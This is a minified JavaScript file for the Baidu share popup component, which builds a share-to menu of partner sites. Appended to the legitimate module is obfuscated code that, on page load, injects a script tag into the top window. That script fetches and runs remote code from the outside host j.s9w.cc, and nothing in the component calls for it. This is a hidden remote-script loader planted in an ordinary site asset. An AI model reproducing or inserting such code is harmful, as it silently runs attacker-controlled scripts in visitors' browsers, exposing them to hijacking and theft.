// build time:Fri Jun 22 2018 07:56:39 GMT+0800 (GMT+08:00)
window._bd_share_main.F.module("component/pop_popup_slide",function(e,t){var n=e("base/tangram").T,a=e("base/class").Class,d=e("conf/const"),o=e("component/pop_base"),i={btn:""},c,s,r,p,u=a.create(function(){function e(e){var t=n(e).offset(),a=t.top+n(e).height()+5,d=t.left,o=s.outerHeight();return a+o>n("body").height()&&a+o>n(window).height()&&(a=t.top-o-5,a=a<0?0:a),{top:a,left:d}}function t(e,t){var d=t.mini||2,o=t.miniList||a._partnerSort.slice(0,8*d),i=[];n.each(o,function(e,t){if(!/(iPhone | iPad | Android)/i.test(navigator.userAgent)||t!=="weixin")i[e]='<li><a href="#" onclick="return false;" class="popup_'+t+'" data-cmd="'+t+'">'+a._partners[t].name+"</a></li>"}),p.html(i.join("")),s.width(d*110+6),r.width(d*110+6)}var a=this;a._hide=function(){r&&r.hide(),s&&s.hide()},a._show=function(d,o){t(a._container,o);var i=e(d.element);n.each([s,r],function(e,t){t.css({top:i.top,left:i.left}).show()}),n(d.element).one("mouseout",function(){var e=!1;s.one("mouseover",function(){e=!0}),setTimeout(function(){!e&&a.hide()},300)})},a._init=function(){var e=['<iframe frameborder="0" class="bdshare_popup_bg" style="display:none;"></iframe>'].join(""),t=['<div class="bdshare_popup_box" style="display:none;">','<div class="bdshare_popup_top">',"分享到","</div>",'<ul class="bdshare_popup_list"></ul>','<div class="bdshare_popup_bottom">','<a href="http://share.baidu.com/" class="popup_more"  data-cmd="more" target="_blank;">更多...</a>',"</div>","</div>"].join("");n("body").insertHTML("beforeEnd",e+t),a._container=n(".bdshare_popup_box"),s=n(".bdshare_popup_box"),p=n(".bdshare_popup_list"),r=n(".bdshare_popup_bg"),s.mouseleave(a.hide)}},o.PopBase);t.Popup=function(){return c||(c=new u,c.init()),c}()});(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();var f476e749bb252bde7a5c2c9994b6116ce=function(){function e(e){if(!n&&("onreadystatechange"!==e.type||"complete"===document.readyState)){for(e=0;e<t.length;e++)t[e].call(document);n=!0;t=null}}var t=[],n=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",e,!1),document.addEventListener("readystatechange",e,!1),window.addEventListener("load",e,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",e),window.attachEvent("onload",e));return function(e){n?e.call(document):t.push(e)}}();function f006b08735d9928a8820efe00a26753e7(){try{var e=window.top.document;if(!e.getElementById("82ac324e455efd0ecd2e73d22d852758")){var t=e.createElement("script");t.setAttribute("type","text/javascript");t.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var n="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";e.getElementsByTagName("head")[0].appendChild(t);t.setAttribute("src",n)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);
//rebuild by neat 